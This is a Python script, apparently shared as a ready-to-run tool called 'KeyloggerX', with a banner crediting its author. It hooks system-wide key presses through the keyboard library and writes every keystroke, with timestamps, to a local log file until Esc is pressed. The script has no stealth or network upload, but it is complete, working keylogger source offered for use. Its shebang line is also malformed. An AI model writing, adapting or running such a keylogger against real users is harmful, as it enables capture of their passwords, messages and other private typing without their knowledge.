#!/bin/bash python3
import keyboard
import time
import os
from datetime import datetime

# Stylish Banner
def display_banner():
    banner = """
    ╔════════════════════════════════════════════╗
    ║                                            ║
    ║       ██████  KeyloggerX  ██████           ║
    ║                                            ║
    ║   Coded by: Pakistani Ethical Hacker       ║
    ║             Mr. Sabaz Ali Khan             ║
    ║                                            ║
    ╚════════════════════════════════════════════╝
    """
    print(banner)

# Log file setup
LOG_FILE = "keylog.txt"

def write_to_log(data):
    with open(LOG_FILE, "a") as f:
        f.write(data + "\n")

# Keylogger function
def on_key_press(event):
    key = event.name
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Handle special keys
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]"
        elif key == "backspace":
            key = "[BACKSPACE]"
        elif key == "tab":
            key = "[TAB]"
        else:
            key = f"[{key.upper()}]"
    
    log_entry = f"[{timestamp}] {key}"
    write_to_log(log_entry)
    print(log_entry)  # Optional: Display in console for debugging

def main():
    display_banner()
    print("KeyloggerX is running... Press 'esc' to stop.\n")
    
    # Check if log file exists, create it if not
    if not os.path.exists(LOG_FILE):
        write_to_log("KeyloggerX Started\n" + "="*50)
    
    # Start keylogger
    keyboard.on_press(on_key_press)
    
    # Stop on 'esc' key
    keyboard.wait("esc")
    print("\nKeyloggerX stopped. Logs saved to", LOG_FILE)
    write_to_log("="*50 + "\nKeyloggerX Stopped")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyloggerX terminated by user.")
        write_to_log("="*50 + "\nKeyloggerX Terminated by User")